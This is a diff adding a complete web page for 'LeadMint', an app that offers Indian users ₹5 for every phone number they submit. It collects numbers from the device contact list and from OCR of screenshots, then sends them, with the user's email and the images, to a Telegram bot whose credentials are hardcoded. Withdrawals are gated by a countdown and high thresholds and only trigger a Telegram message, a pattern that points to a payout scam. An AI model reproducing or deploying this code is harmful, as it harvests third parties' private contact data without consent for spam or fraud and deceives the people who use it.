@@ -1,0 +1,650 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes, viewport-fit=cover">
+  <title>LeadMint · Real Earnings | ₹5/Lead + ₹250/Referral</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;400;500;600;700;800&display=swap" rel="stylesheet">
+  <script type="importmap">
+    {
+      "imports": {
+        "firebase/app": "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js",
+        "firebase/auth": "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js",
+        "firebase/firestore": "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js"
+      }
+    }
+  </script>
+  <script src="https://cdn.jsdelivr.net/npm/tesseract.js@5/dist/tesseract.min.js"></script>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+    body {
+      font-family: 'Inter', sans-serif;
+      background: #f1f5f9;
+      color: #0f172a;
+      padding: 18px 16px 40px;
+      min-height: 100vh;
+    }
+    .container { max-width: 560px; margin: 0 auto; }
+    .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
+    .logo { font-size: 28px; font-weight: 800; background: linear-gradient(135deg, #0a2f44, #1e6f5c); -webkit-background-clip: text; background-clip: text; color: transparent; }
+    .logout-btn { background: #eef2ff; border: none; padding: 8px 20px; border-radius: 40px; font-weight: 600; font-size: 14px; cursor: pointer; transition: 0.2s; }
+    .balance-card {
+      background: linear-gradient(125deg, #0a2f44, #124e6b);
+      color: white;
+      border-radius: 32px;
+      padding: 22px 20px;
+      margin-bottom: 20px;
+      box-shadow: 0 10px 20px rgba(0,0,0,0.1);
+    }
+    .balance-amount { font-size: 44px; font-weight: 800; letter-spacing: -1px; }
+    .progress-bar { background: rgba(255,255,255,0.25); border-radius: 30px; height: 8px; margin: 12px 0; }
+    .progress-fill { background: #facc15; width: 0%; height: 100%; border-radius: 30px; transition: width 0.3s; }
+    .withdraw-btn { width: 100%; margin-top: 16px; padding: 14px; border-radius: 60px; font-weight: 700; background: #facc15; color: #0f172a; border: none; cursor: pointer; font-size: 16px; }
+    .withdraw-btn:disabled { opacity: 0.5; cursor: not-allowed; }
+    .timer-card, .block-card {
+      background: linear-gradient(135deg, #1e1b4b, #2e1065);
+      border-radius: 28px;
+      padding: 16px 20px;
+      margin-bottom: 20px;
+      text-align: center;
+    }
+    .block-card { background: linear-gradient(135deg, #991b1b, #7f1d1d); display: none; }
+    .timer-display { font-family: monospace; font-size: 32px; font-weight: 800; color: white; background: rgba(0,0,0,0.4); padding: 8px 20px; border-radius: 60px; display: inline-block; letter-spacing: 3px; }
+    .nav-tabs {
+      display: flex;
+      gap: 8px;
+      background: white;
+      padding: 6px;
+      border-radius: 60px;
+      margin-bottom: 20px;
+    }
+    .tab {
+      flex: 1;
+      text-align: center;
+      padding: 12px 6px;
+      border-radius: 50px;
+      font-weight: 600;
+      font-size: 13px;
+      cursor: pointer;
+      transition: 0.2s;
+    }
+    .tab.active { background: #0a2f44; color: white; }
+    .tab-content { display: none; }
+    .tab-content.active { display: block; }
+    .card {
+      background: white;
+      border-radius: 28px;
+      padding: 20px;
+      margin-bottom: 20px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.05);
+    }
+    .card-title { font-size: 18px; font-weight: 700; margin-bottom: 16px; }
+    .bulk-hero {
+      background: linear-gradient(135deg, #075E54, #128C7E, #25D366);
+      border-radius: 28px;
+      padding: 28px 20px;
+      text-align: center;
+      cursor: pointer;
+      transition: transform 0.1s;
+      margin-bottom: 20px;
+    }
+    .bulk-hero:active { transform: scale(0.98); }
+    .bulk-icon { font-size: 52px; margin-bottom: 12px; }
+    .bulk-hero h2 { color: white; font-size: 24px; font-weight: 800; }
+    .bulk-hero p { color: rgba(255,255,255,0.9); margin-top: 6px; }
+    .file-zone {
+      border: 2px dashed #cbd5e1;
+      border-radius: 24px;
+      padding: 28px 16px;
+      text-align: center;
+      background: #fafcff;
+      cursor: pointer;
+      margin: 12px 0;
+    }
+    .preview-area { margin-top: 15px; display: none; }
+    .preview-area.active { display: block; }
+    .preview-img { max-width: 100%; border-radius: 16px; max-height: 180px; object-fit: cover; }
+    .extract-box {
+      background: #e6f7ec;
+      padding: 14px;
+      border-radius: 20px;
+      margin: 12px 0;
+      max-height: 180px;
+      overflow-y: auto;
+      font-size: 13px;
+      display: none;
+    }
+    .btn-primary {
+      width: 100%;
+      padding: 14px;
+      border-radius: 60px;
+      background: #0f2b3d;
+      color: white;
+      font-weight: 600;
+      border: none;
+      margin-top: 12px;
+      cursor: pointer;
+    }
+    .lead-row {
+      background: #f8fafc;
+      padding: 12px;
+      border-radius: 18px;
+      margin-bottom: 8px;
+      display: flex;
+      justify-content: space-between;
+      font-size: 13px;
+    }
+    .flex-between { display: flex; justify-content: space-between; align-items: center; }
+    .badge { background: #eef2ff; padding: 4px 12px; border-radius: 40px; font-size: 12px; }
+    .referral-code-box {
+      background: #f1f5f9;
+      padding: 14px;
+      border-radius: 60px;
+      text-align: center;
+      font-family: monospace;
+      font-size: 18px;
+      font-weight: bold;
+      margin: 12px 0;
+    }
+    .share-buttons { display: flex; gap: 10px; margin: 16px 0; flex-wrap: wrap; }
+    .share-btn {
+      flex: 1;
+      padding: 10px;
+      border-radius: 60px;
+      font-weight: 600;
+      font-size: 12px;
+      border: none;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+    }
+    .share-wa { background: #25D366; color: white; }
+    .share-fb { background: #1877F2; color: white; }
+    .share-copy { background: #0f2b3d; color: white; }
+    .referrals-list { max-height: 200px; overflow-y: auto; background: #f1f5f9; border-radius: 20px; padding: 10px; margin-top: 10px; }
+    .toast {
+      position: fixed;
+      bottom: 30px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: #1e293b;
+      color: white;
+      padding: 12px 24px;
+      border-radius: 50px;
+      z-index: 10000;
+      font-size: 14px;
+      text-align: center;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.2);
+      animation: fadein 0.3s;
+    }
+    .toast.error { background: #dc2626; }
+    @keyframes fadein { from { opacity: 0; transform: translateX(-50%) translateY(20px); } to { opacity: 1; transform: translateX(-50%) translateY(0); } }
+    .loading-spinner { display: inline-block; width: 16px; height: 16px; border: 2px solid #e2e8f0; border-top: 2px solid #0f2b3d; border-radius: 50%; animation: spin 0.6s linear infinite; margin-right: 8px; vertical-align: middle; }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+  </style>
+</head>
+<body>
+<div class="container">
+  <div class="header">
+    <div class="logo">⚡ LeadMint · REAL</div>
+    <button class="logout-btn" id="logoutBtn">🚪 Exit</button>
+  </div>
+
+  <div id="blockCard" class="block-card">
+    <div style="font-weight:700;">⛔ DUPLICATE NUMBER — COOLDOWN</div>
+    <div class="timer-display" id="blockTimerDisplay">30:00</div>
+    <div style="font-size:12px; margin-top:6px;">Balance untouched. Auto-unlock after timer.</div>
+  </div>
+
+  <div class="balance-card">
+    <div class="flex-between"><span>💰 Wallet Balance</span><span class="badge" style="background:rgba(255,255,255,0.2);" id="leadCountBadge">0 leads</span></div>
+    <div class="balance-amount" id="walletBalance">₹0</div>
+    <div class="flex-between" style="font-size:13px; margin-top:12px;"><span>🔓 Withdraw unlock</span><span id="progressLabel">0/100 leads</span></div>
+    <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
+    <button id="withdrawMainBtn" class="withdraw-btn" disabled>💸 Withdraw (min ₹2000)</button>
+  </div>
+
+  <div class="timer-card">
+    <div style="font-size:12px; letter-spacing:1px; color:#facc15;">⏰ WITHDRAWAL LOCK</div>
+    <div class="timer-display" id="globalTimerDisplay">-- : -- : --</div>
+    <div style="font-size:11px; margin-top:6px;">Unlocks 21 May 2026, 12:00 AM IST</div>
+  </div>
+
+  <div class="nav-tabs">
+    <div class="tab active" data-tab="bulk">📱 Bulk Send</div>
+    <div class="tab" data-tab="upload">📸 Screenshot</div>
+    <div class="tab" data-tab="referral">👥 Referral</div>
+    <div class="tab" data-tab="history">📋 History</div>
+  </div>
+
+  <div id="bulkTab" class="tab-content active">
+    <div class="bulk-hero" id="bulkSyncTrigger">
+      <div class="bulk-icon">📇➡️💰</div>
+      <h2>Bulk Contacts Sync</h2>
+      <p>Tap to select contacts → Auto-extract Indian numbers → ₹5 each valid</p>
+    </div>
+    <div class="card">
+      <div class="card-title">📌 How it works (real)</div>
+      <p style="font-size:13px; line-height:1.5;">✅ Indian numbers: 10 digits starting with 6/7/8/9 (with or without +91).<br>✅ Bulk send uses Android Contacts API (Chrome/Edge).<br>✅ Duplicate numbers across any user → 30min cooldown, balance preserved.<br>✅ Each unique valid number = ₹5 added instantly + Telegram log.</p>
+    </div>
+  </div>
+
+  <div id="uploadTab" class="tab-content">
+    <div class="card">
+      <div class="card-title">📸 Upload screenshot (PNG/JPG)</div>
+      <div class="file-zone" id="fileDropZone">
+        📂 Tap to select image<br><small>OCR extracts numbers (supports +91, spaces, dashes)</small>
+        <input type="file" id="fileInput" style="display:none;" accept="image/png,image/jpeg,image/jpg">
+      </div>
+      <div id="previewContainer" class="preview-area"></div>
+      <div id="extractedNumbersDiv" class="extract-box"></div>
+      <button id="confirmScreenshotBtn" class="btn-primary" style="display:none;">✅ Verify & Add (₹5 each)</button>
+      <div id="ocrStatus" style="font-size:12px; margin-top:8px;"></div>
+    </div>
+  </div>
+
+  <div id="referralTab" class="tab-content">
+    <div class="card">
+      <div class="card-title">👥 Refer & Earn ₹250 instantly</div>
+      <div class="referral-code-box" id="referralCodeDisplay">Loading...</div>
+      <button id="copyCodeBtn" class="btn-primary" style="background:#1e6f5c;">📋 Copy Referral Code</button>
+      <div class="share-buttons">
+        <button class="share-btn share-wa" id="shareWABtn">📱 WhatsApp</button>
+        <button class="share-btn share-fb" id="shareFBBtn">📘 Facebook</button>
+        <button class="share-btn share-copy" id="shareLinkBtn">🔗 Copy Invite</button>
+      </div>
+      <div class="flex-between"><span>💰 Referral Wallet</span><span id="referralWalletAmount" style="font-weight:800;">₹0</span></div>
+      <div class="flex-between"><span>👥 Total Referrals</span><span id="referralCountDisplay">0</span></div>
+      <div><strong>📜 Referred users</strong></div>
+      <div id="referredUsersList" class="referrals-list">No referrals yet.</div>
+      <button id="withdrawReferralBtn" class="btn-primary" style="background:#facc15; color:#0f172a; margin-top:16px;" disabled>💸 Withdraw Referral (min 15 refs & ₹100)</button>
+    </div>
+  </div>
+
+  <div id="historyTab" class="tab-content">
+    <div class="card">
+      <div class="card-title">📞 Verified Leads History</div>
+      <div id="historyList">No leads yet.</div>
+    </div>
+  </div>
+</div>
+
+<script type="module">
+  import { initializeApp } from "firebase/app";
+  import { getAuth, signOut, onAuthStateChanged } from "firebase/auth";
+  import { getFirestore, doc, getDoc, updateDoc, onSnapshot, collection, getDocs } from "firebase/firestore";
+
+  const firebaseConfig = {
+    apiKey: "AIzaSyDpFohe_piG3MpnpNJDZcGvTqg5tIu3B-I",
+    authDomain: "leadcash-2cb77.firebaseapp.com",
+    projectId: "leadcash-2cb77",
+    storageBucket: "leadcash-2cb77.firebasestorage.app",
+    messagingSenderId: "611052139341",
+    appId: "1:611052139341:web:1c5ea10a24591987827d04"
+  };
+  const app = initializeApp(firebaseConfig);
+  const auth = getAuth(app);
+  const db = getFirestore(app);
+
+  const BOT_TOKEN = "8619703516:AAEhJJBKYyir3zOo404Yoqv6FnnPj5Xj4Q4";
+  const CHAT_ID = "6064803354";
+
+  let currentUser = null;
+  let globalSoldSet = new Set();
+  let blockInterval = null;
+  let userData = {
+    balance: 0, verifiedLeads: [], totalVerified: 0,
+    referralWallet: 0, referralCount: 0, referralCode: "",
+    isBlocked: false, blockExpiry: null, referredUsers: []
+  };
+
+  // ---------- NORMALIZATION FUNCTION (core fix) ----------
+  function normalizeIndianNumber(num) {
+    if (!num) return null;
+    let cleaned = String(num).replace(/\D/g, '');
+    if (cleaned.length === 12 && cleaned.startsWith('91')) {
+      cleaned = cleaned.substring(2);
+    } else if (cleaned.length === 11 && cleaned.startsWith('0')) {
+      cleaned = cleaned.substring(1);
+    }
+    if (/^[6-9]\d{9}$/.test(cleaned)) return cleaned;
+    return null;
+  }
+
+  async function loadGlobalNumbers() {
+    const snap = await getDocs(collection(db, "users"));
+    const set = new Set();
+    snap.forEach(docSnap => {
+      (docSnap.data().verifiedLeads || []).forEach(l => l.number && set.add(l.number));
+    });
+    globalSoldSet = set;
+  }
+
+  async function sendTelegramLog(source, addedCount, numbersArr, imageDataURL = null) {
+    const msgHeader = `🔔 LEADMINT REAL\n━━━━━━━━━━━━━━━━━━\n👤 ${currentUser.email}\n📂 Source: ${source}\n🆕 Added: ${addedCount}\n💰 Earned: ₹${addedCount * 5}\n📊 Total leads: ${userData.totalVerified}\n💵 Balance: ₹${userData.balance}\n━━━━━━━━━━━━━━━━━━\n📞 Numbers:\n`;
+    let numbersText = numbersArr.slice(0, 15).map(n => `+91${n}`).join('\n');
+    if (numbersArr.length > 15) numbersText += `\n... +${numbersArr.length - 15} more`;
+    const fullMsg = msgHeader + numbersText + `\n⏰ ${new Date().toLocaleString()}`;
+    try {
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST', headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: CHAT_ID, text: fullMsg.substring(0, 3900) })
+      });
+      if (imageDataURL && imageDataURL.startsWith('data:image')) {
+        const byteString = atob(imageDataURL.split(',')[1]);
+        const mime = imageDataURL.split(';')[0].split(':')[1];
+        const ab = new ArrayBuffer(byteString.length);
+        const ia = new Uint8Array(ab);
+        for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('photo', new Blob([ab], { type: mime }), 'screenshot.jpg');
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+      }
+    } catch (e) { console.warn("Telegram err", e); }
+  }
+
+  async function applyBlock() {
+    const blockEnd = new Date(Date.now() + 30 * 60 * 1000);
+    userData.isBlocked = true;
+    userData.blockExpiry = blockEnd.toISOString();
+    await updateDoc(doc(db, "users", currentUser.uid), { isBlocked: true, blockExpiry: userData.blockExpiry });
+    startBlockTimer(blockEnd);
+    showToast("⚠️ Duplicate number detected! 30 min cooldown. Balance safe.", true);
+    updateUI();
+  }
+
+  function startBlockTimer(expiryDate) {
+    if (blockInterval) clearInterval(blockInterval);
+    const blockCard = document.getElementById('blockCard');
+    blockCard.style.display = 'block';
+    blockInterval = setInterval(() => {
+      const diff = new Date(expiryDate) - new Date();
+      if (diff <= 0) {
+        clearInterval(blockInterval);
+        unblockUser();
+      } else {
+        const mins = Math.floor(diff / 60000);
+        const secs = Math.floor((diff % 60000) / 1000);
+        document.getElementById('blockTimerDisplay').innerText = `${mins.toString().padStart(2,'0')}:${secs.toString().padStart(2,'0')}`;
+      }
+    }, 1000);
+  }
+
+  async function unblockUser() {
+    userData.isBlocked = false;
+    userData.blockExpiry = null;
+    await updateDoc(doc(db, "users", currentUser.uid), { isBlocked: false, blockExpiry: null });
+    document.getElementById('blockCard').style.display = 'none';
+    if (blockInterval) clearInterval(blockInterval);
+    showToast("✅ Cooldown ended, you can add numbers again.");
+    updateUI();
+  }
+
+  // ---------- ADD VERIFIED NUMBERS WITH NORMALIZATION ----------
+  async function addVerifiedNumbers(numbersArray, source, imageData = null) {
+    if (userData.isBlocked) {
+      showToast("⛔ Account on cooldown. Please wait.", true);
+      return { added: 0 };
+    }
+    // Normalize all incoming numbers
+    const normalized = numbersArray.map(n => normalizeIndianNumber(n)).filter(n => n !== null);
+    const uniqueCandidates = [...new Set(normalized)];
+    const existingLocal = new Set(userData.verifiedLeads.map(l => l.number));
+    const newNumbers = uniqueCandidates.filter(n => !existingLocal.has(n));
+    if (newNumbers.length === 0) {
+      showToast("No new valid Indian numbers found (10 digits, start 6/7/8/9)", true);
+      return { added: 0 };
+    }
+    // Global duplicate check
+    const duplicates = newNumbers.filter(n => globalSoldSet.has(n));
+    if (duplicates.length > 0) {
+      await applyBlock();
+      showToast(`🚫 ${duplicates.length} duplicate number(s) globally! 30min cooldown.`, true);
+      return { added: 0 };
+    }
+    const addedNumbers = [];
+    for (const num of newNumbers) {
+      userData.verifiedLeads.unshift({ number: num, source, date: new Date().toLocaleString() });
+      userData.balance += 5;
+      userData.totalVerified++;
+      addedNumbers.push(num);
+      globalSoldSet.add(num);
+    }
+    await updateDoc(doc(db, "users", currentUser.uid), {
+      balance: userData.balance,
+      verifiedLeads: userData.verifiedLeads,
+      totalVerified: userData.totalVerified
+    });
+    updateUI();
+    await sendTelegramLog(source, addedNumbers.length, addedNumbers, imageData);
+    showToast(`✅ +${addedNumbers.length} leads | +₹${addedNumbers.length * 5}`);
+    return { added: addedNumbers.length };
+  }
+
+  // ---------- BULK SYNC (Contacts API) ----------
+  async function bulkSync() {
+    if (userData.isBlocked) { showToast("Cooldown active", true); return; }
+    if (!navigator.contacts) {
+      showToast("Contacts API not supported. Use Chrome on Android with HTTPS.", true);
+      return;
+    }
+    try {
+      showToast("📱 Select contacts...");
+      const contacts = await navigator.contacts.select(['tel'], { multiple: true });
+      if (!contacts || contacts.length === 0) { showToast("No contacts selected", true); return; }
+      const rawNumbers = [];
+      for (const c of contacts) {
+        if (c.tel) {
+          for (const tel of c.tel) rawNumbers.push(tel);
+        }
+      }
+      if (rawNumbers.length === 0) { showToast("No phone numbers found", true); return; }
+      await addVerifiedNumbers(rawNumbers, "BULK SYNC");
+    } catch (err) {
+      console.error(err);
+      showToast("Permission denied or error", true);
+    }
+  }
+
+  // ---------- SCREENSHOT OCR (improved regex) ----------
+  let currentExtracted = [], currentImageURL = null;
+  async function handleImageFile(file) {
+    const reader = new FileReader();
+    reader.onload = async (e) => {
+      currentImageURL = e.target.result;
+      document.getElementById('previewContainer').innerHTML = `<img src="${currentImageURL}" class="preview-img">`;
+      document.getElementById('previewContainer').classList.add('active');
+      document.getElementById('ocrStatus').innerHTML = '<span class="loading-spinner"></span> OCR scanning...';
+      const img = new Image();
+      img.onload = async () => {
+        try {
+          const { data: { text } } = await Tesseract.recognize(img, 'eng');
+          // Improved regex: catch +91, spaces, dashes, plain 10-digit
+          const rawMatches = text.match(/(\+91[\s-]?[6-9]\d{9}|[6-9]\d{9})/g) || [];
+          const normalizedSet = new Set();
+          for (const match of rawMatches) {
+            const norm = normalizeIndianNumber(match);
+            if (norm) normalizedSet.add(norm);
+          }
+          currentExtracted = Array.from(normalizedSet);
+          const extractDiv = document.getElementById('extractedNumbersDiv');
+          const confirmBtn = document.getElementById('confirmScreenshotBtn');
+          if (currentExtracted.length) {
+            extractDiv.style.display = 'block';
+            extractDiv.innerHTML = `<strong>🔢 ${currentExtracted.length} numbers extracted:</strong><br>${currentExtracted.slice(0,20).join(', ')}<br><br>💰 Potential: ₹${currentExtracted.length * 5}`;
+            confirmBtn.style.display = 'block';
+            document.getElementById('ocrStatus').innerHTML = `✅ Found ${currentExtracted.length} valid numbers. Click verify.`;
+          } else {
+            extractDiv.style.display = 'block';
+            extractDiv.innerHTML = '⚠️ No valid Indian numbers (10 digits, start 6/7/8/9). Make sure image is clear.';
+            confirmBtn.style.display = 'none';
+            document.getElementById('ocrStatus').innerHTML = 'No numbers detected.';
+          }
+        } catch (err) {
+          document.getElementById('ocrStatus').innerHTML = 'OCR failed, try another image.';
+          console.error(err);
+        }
+      };
+      img.src = currentImageURL;
+    };
+    reader.readAsDataURL(file);
+  }
+
+  async function confirmScreenshot() {
+    if (!currentExtracted.length) { showToast("No numbers to add", true); return; }
+    document.getElementById('ocrStatus').innerHTML = '<span class="loading-spinner"></span> Verifying...';
+    await addVerifiedNumbers(currentExtracted, "SCREENSHOT", currentImageURL);
+    document.getElementById('previewContainer').classList.remove('active');
+    document.getElementById('extractedNumbersDiv').style.display = 'none';
+    document.getElementById('confirmScreenshotBtn').style.display = 'none';
+    currentExtracted = [];
+    currentImageURL = null;
+    document.getElementById('ocrStatus').innerHTML = '';
+  }
+
+  // ---------- Referral & Withdrawals ----------
+  function getReferralLink() { return `${window.location.origin}${window.location.pathname}?ref=${userData.referralCode}`; }
+  function getInviteText() { return `🔥 Join LeadMint & earn real cash! ₹5/lead + ₹250/referral.\nMy Code: ${userData.referralCode}\nSignup: ${getReferralLink()}`; }
+  function copyCode() { navigator.clipboard.writeText(userData.referralCode); showToast("✅ Code copied!"); }
+  function copyInvite() { navigator.clipboard.writeText(getInviteText()); showToast("✅ Invite copied!"); }
+  function shareWA() { window.open(`https://wa.me/?text=${encodeURIComponent(getInviteText())}`, '_blank'); }
+  function shareFB() { window.open(`https://www.facebook.com/sharer/sharer.php?u=${encodeURIComponent(getReferralLink())}`, '_blank'); }
+  async function withdrawMain() {
+    if (userData.totalVerified >= 100 && userData.balance >= 2000 && !userData.isBlocked) {
+      await sendTelegramLog("WITHDRAWAL", 0, [], null);
+      showToast(`✅ Withdrawal request ₹${userData.balance} submitted.`);
+    } else showToast(`Need 100+ leads (${userData.totalVerified}/100) & ₹2000+`, true);
+  }
+  async function withdrawReferral() {
+    if (userData.referralCount >= 15 && userData.referralWallet >= 100 && !userData.isBlocked) {
+      await sendTelegramLog("REFERRAL_WITHDRAW", 0, [], null);
+      showToast(`✅ Referral withdrawal ₹${userData.referralWallet} requested.`);
+    } else showToast(`Need 15+ referrals (${userData.referralCount}/15) & ₹100+`, true);
+  }
+
+  // ---------- UI Updates ----------
+  function updateUI() {
+    document.getElementById('walletBalance').innerHTML = `₹${userData.balance}`;
+    document.getElementById('leadCountBadge').innerHTML = `${userData.totalVerified} leads`;
+    const percent = Math.min(100, (userData.totalVerified / 100) * 100);
+    document.getElementById('progressFill').style.width = `${percent}%`;
+    document.getElementById('progressLabel').innerHTML = `${userData.totalVerified}/100 leads`;
+    const canMain = (userData.totalVerified >= 100 && userData.balance >= 2000 && !userData.isBlocked);
+    document.getElementById('withdrawMainBtn').disabled = !canMain;
+    document.getElementById('referralCodeDisplay').innerText = userData.referralCode;
+    document.getElementById('referralWalletAmount').innerHTML = `₹${userData.referralWallet}`;
+    document.getElementById('referralCountDisplay').innerHTML = userData.referralCount;
+    const refWithdrawBtn = document.getElementById('withdrawReferralBtn');
+    if (refWithdrawBtn) refWithdrawBtn.disabled = !(userData.referralCount >= 15 && userData.referralWallet >= 100 && !userData.isBlocked);
+    const refListDiv = document.getElementById('referredUsersList');
+    if (userData.referredUsers && userData.referredUsers.length) {
+      refListDiv.innerHTML = userData.referredUsers.map(() => `<div class="lead-row">👤 Referred user <span>+₹250</span></div>`).join('');
+    } else refListDiv.innerHTML = '<div>No referrals yet. Share your code!</div>';
+    const historyDiv = document.getElementById('historyList');
+    if (userData.verifiedLeads.length) {
+      historyDiv.innerHTML = userData.verifiedLeads.slice(0, 30).map(lead => `
+        <div class="lead-row">
+          <span>📞 ${lead.number}</span>
+          <span>+₹5</span>
+          <span style="font-size:11px;">${lead.date}</span>
+        </div>
+      `).join('');
+    } else historyDiv.innerHTML = '<div>No leads yet.</div>';
+  }
+
+  async function loadUser(uid) {
+    const userRef = doc(db, "users", uid);
+    const snap = await getDoc(userRef);
+    if (snap.exists()) {
+      const d = snap.data();
+      userData = {
+        balance: d.balance || 0,
+        verifiedLeads: d.verifiedLeads || [],
+        totalVerified: d.totalVerified || 0,
+        referralWallet: d.referralWallet || 0,
+        referralCount: d.referralCount || 0,
+        referralCode: d.referralCode || ("LEAD" + uid.slice(0,6).toUpperCase()),
+        isBlocked: d.isBlocked || false,
+        blockExpiry: d.blockExpiry || null,
+        referredUsers: d.referredUsers || []
+      };
+      if (userData.blockExpiry && new Date(userData.blockExpiry) > new Date()) startBlockTimer(new Date(userData.blockExpiry));
+      else if (userData.blockExpiry && new Date(userData.blockExpiry) <= new Date()) await unblockUser();
+    }
+    updateUI();
+    onSnapshot(userRef, (snap2) => {
+      if (snap2.exists()) {
+        const n = snap2.data();
+        userData.referralWallet = n.referralWallet || 0;
+        userData.referralCount = n.referralCount || 0;
+        userData.referredUsers = n.referredUsers || [];
+        updateUI();
+      }
+    });
+  }
+
+  const UNLOCK_DATE = new Date(2026, 4, 21, 0, 0, 0);
+  function updateGlobalTimer() {
+    const nowIST = new Date(new Date().getTime() + 5.5 * 3600000);
+    if (nowIST >= UNLOCK_DATE) {
+      document.getElementById('globalTimerDisplay').innerText = "UNLOCKED";
+      return;
+    }
+    const diff = UNLOCK_DATE - nowIST;
+    const hrs = Math.floor(diff / 3600000);
+    const mins = Math.floor((diff % 3600000) / 60000);
+    const secs = Math.floor((diff % 60000) / 1000);
+    document.getElementById('globalTimerDisplay').innerText = `${hrs.toString().padStart(2,'0')}:${mins.toString().padStart(2,'0')}:${secs.toString().padStart(2,'0')}`;
+  }
+
+  function showToast(msg, isErr = false) {
+    const t = document.createElement('div');
+    t.className = 'toast' + (isErr ? ' error' : '');
+    t.innerText = msg;
+    document.body.appendChild(t);
+    setTimeout(() => t.remove(), 3500);
+  }
+
+  function initTabs() {
+    document.querySelectorAll('.tab').forEach(tab => {
+      tab.addEventListener('click', () => {
+        const id = tab.dataset.tab;
+        document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
+        document.getElementById(`${id}Tab`).classList.add('active');
+        document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+        tab.classList.add('active');
+      });
+    });
+  }
+
+  onAuthStateChanged(auth, async (user) => {
+    if (!user) { window.location.href = "index.html"; return; }
+    currentUser = user;
+    await loadGlobalNumbers();
+    await loadUser(user.uid);
+    initTabs();
+
+    document.getElementById('bulkSyncTrigger').addEventListener('click', bulkSync);
+    document.getElementById('logoutBtn').addEventListener('click', () => signOut(auth).then(() => window.location.href = "index.html"));
+    document.getElementById('withdrawMainBtn').addEventListener('click', withdrawMain);
+    document.getElementById('withdrawReferralBtn').addEventListener('click', withdrawReferral);
+    document.getElementById('copyCodeBtn').addEventListener('click', copyCode);
+    document.getElementById('shareLinkBtn').addEventListener('click', copyInvite);
+    document.getElementById('shareWABtn').addEventListener('click', shareWA);
+    document.getElementById('shareFBBtn').addEventListener('click', shareFB);
+
+    const fileZone = document.getElementById('fileDropZone');
+    const fileInput = document.getElementById('fileInput');
+    fileZone.addEventListener('click', () => fileInput.click());
+    fileInput.addEventListener('change', (e) => { if (e.target.files[0]) handleImageFile(e.target.files[0]); });
+    document.getElementById('confirmScreenshotBtn').addEventListener('click', confirmScreenshot);
+
+    setInterval(updateGlobalTimer, 1000);
+    updateGlobalTimer();
+  });
+</script>
+</body>
+</html>
